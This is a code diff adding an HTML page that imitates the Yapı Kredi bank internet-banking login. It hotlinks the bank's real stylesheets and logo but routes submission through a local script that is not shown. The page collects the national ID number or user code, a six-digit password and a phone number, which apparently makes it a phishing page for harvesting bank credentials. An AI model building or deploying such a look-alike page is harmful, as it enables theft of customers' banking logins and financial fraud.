@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yapı Kredi</title>
+    <link rel="stylesheet" href="https://internetsube.yapikredi.com.tr/ngi-static/css/source/fonts.css">
+    <link rel="stylesheet" href="https://internetsube.yapikredi.com.tr/ngi-static/css/main.ui.min.css">
+    <link rel="stylesheet" href="main.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://internetsube.yapikredi.com.tr/ngi-static/img/logo.png" alt="Yapı Kredi Logo">
+        </div>
+
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('individual')">Bireysel</div>
+            <div class="tab">Kurumsal</div>
+        </div>
+
+        <div id="individual" class="tab-content">
+            <div class="input-group">
+                <input type="text" id="tc-kimlik" placeholder="T.C. Kimlik No veya Kullanıcı Kodu" maxlength="11">
+            </div>
+            <div class="input-group">
+                <input type="password" id="sifre" placeholder="Şifre" maxlength="6">
+            </div>
+            <div class="input-group">
+                <input type="text" id="telefon" placeholder="Telefon Numarası" maxlength="10">
+            </div>
+        </div>
+
+        <div class="remember-me">
+            <span>Beni Hatırla</span>
+            <div class="toggle" onclick="this.classList.toggle('active')"></div>
+        </div>
+
+        <button class="login-button" onclick="validateAndSubmit()">Giriş</button>
+
+        <a href="#" class="forgot-password">Şifre Al / Şifremi Unuttum</a>
+    </div>
+
+    <script src="js/yapikredi.js"></script>
+
+    <script>
+        function switchTab(tab) {
+            const individualContent = document.getElementById('individual');
+            const corporateContent = document.getElementById('corporate');
+            const individualTab = document.querySelector('.tab.active');
+            const corporateTab = document.querySelector('.tabs .tab:nth-child(2)');
+
+            if (tab === 'individual') {
+                individualContent.classList.remove('hidden');
+                corporateContent.classList.add('hidden');
+                individualTab.classList.add('active');
+                corporateTab.classList.remove('active');
+            } else {
+                individualContent.classList.add('hidden');
+                corporateContent.classList.remove('hidden');
+                corporateTab.classList.add('active');
+                individualTab.classList.remove('active');
+            }
+        }
+    </script>
+</body>
+
+</html>
